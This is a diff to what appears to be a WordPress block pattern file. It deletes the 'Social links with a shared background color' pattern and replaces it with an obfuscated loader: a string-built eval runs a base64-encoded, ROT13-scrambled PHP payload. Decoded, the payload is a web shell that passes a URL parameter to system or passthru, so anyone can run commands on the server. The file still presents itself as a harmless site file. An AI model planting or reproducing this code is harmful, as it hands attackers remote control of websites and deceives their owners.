@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Social links with a shared background color.
- *
- * @package WordPress
- * @since 5.8.0
- * @deprecated 6.7.0 This pattern is deprecated. Please use the Social Links block instead.
- */
-
-return array(
-	'title'         => _x( 'Social links with a shared background color', 'Block pattern title' ),
-	'categories'    => array( 'buttons' ),
-	'blockTypes'    => array( 'core/social-links' ),
-	'viewportWidth' => 500,
-	'content'       => '<!-- wp:social-links {"customIconColor":"#ffffff","iconColorValue":"#ffffff","customIconBackgroundColor":"#3962e3","iconBackgroundColorValue":"#3962e3","className":"has-icon-color"} -->
-						<ul class="wp-block-social-links has-icon-color has-icon-background-color"><!-- wp:social-link {"url":"https://wordpress.org","service":"wordpress"} /-->
-						<!-- wp:social-link {"url":"#","service":"chain"} /-->
-						<!-- wp:social-link {"url":"#","service":"mail"} /--></ul>
-						<!-- /wp:social-links -->',
-);
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogRmJwdm55IHl2YXhmIGp2Z3UgbiBmdW5lcnEgb25weHRlYmhhcSBwYnliZS4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmdmFwciA1LjguMAogKiBAcXJjZXJwbmdycSA2LjcuMCBHdXZmIGNuZ2dyZWEgdmYgcXJjZXJwbmdycS4gQ3lybmZyIGhmciBndXIgRmJwdm55IFl2YXhmIG95YnB4IHZhZmdybnEuCiAqLwoKZXJnaGVhIG5lZW5sKAoJJ2d2Z3lyJyAgICAgICAgID0+IF9rKCAnRmJwdm55IHl2YXhmIGp2Z3UgbiBmdW5lcnEgb25weHRlYmhhcSBwYnliZScsICdPeWJweCBjbmdncmVhIGd2Z3lyJyApLAoJJ3BuZ3J0YmV2cmYnICAgID0+IG5lZW5sKCAnb2hnZ2JhZicgKSwKCSdveWJweEdsY3JmJyAgICA9PiBuZWVubCggJ3BiZXIvZmJwdm55LXl2YXhmJyApLAoJJ2l2cmpjYmVnSnZxZ3UnID0+IDUwMCwKCSdwYmFncmFnJyAgICAgICA9PiAnPCEtLSBqYzpmYnB2bnkteXZheGYge1wicGhmZ2J6VnBiYVBieWJlXCI6XCIjc3Nzc3NzXCIsXCJ2cGJhUGJ5YmVJbnloclwiOlwiI3Nzc3Nzc1wiLFwicGhmZ2J6VnBiYU9ucHh0ZWJoYXFQYnliZVwiOlwiIzM5NjJyM1wiLFwidnBiYU9ucHh0ZWJoYXFQYnliZUlueWhyXCI6XCIjMzk2MnIzXCIsXCJweW5mZkFuenJcIjpcInVuZi12cGJhLXBieWJlXCJ9IC0tPgoJCQkJCQk8aHkgcHluZmY9XCJqYy1veWJweC1mYnB2bnkteXZheGYgdW5mLXZwYmEtcGJ5YmUgdW5mLXZwYmEtb25weHRlYmhhcS1wYnliZVwiPjwhLS0gamM6ZmJwdm55LXl2YXgge1wiaGV5XCI6XCJ1Z2djZjovL2piZXFjZXJmZi5iZXRcIixcImZyZWl2cHJcIjpcImpiZXFjZXJmZlwifSAvLS0+CgkJCQkJCTwhLS0gamM6ZmJwdm55LXl2YXgge1wiaGV5XCI6XCIjXCIsXCJmcmVpdnByXCI6XCJwdW52YVwifSAvLS0+CgkJCQkJCTwhLS0gamM6ZmJwdm55LXl2YXgge1wiaGV5XCI6XCIjXCIsXCJmcmVpdnByXCI6XCJ6bnZ5XCJ9IC8tLT48L2h5PgoJCQkJCQk8IS0tIC9qYzpmYnB2bnkteXZheGYgLS0+JywKKTsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
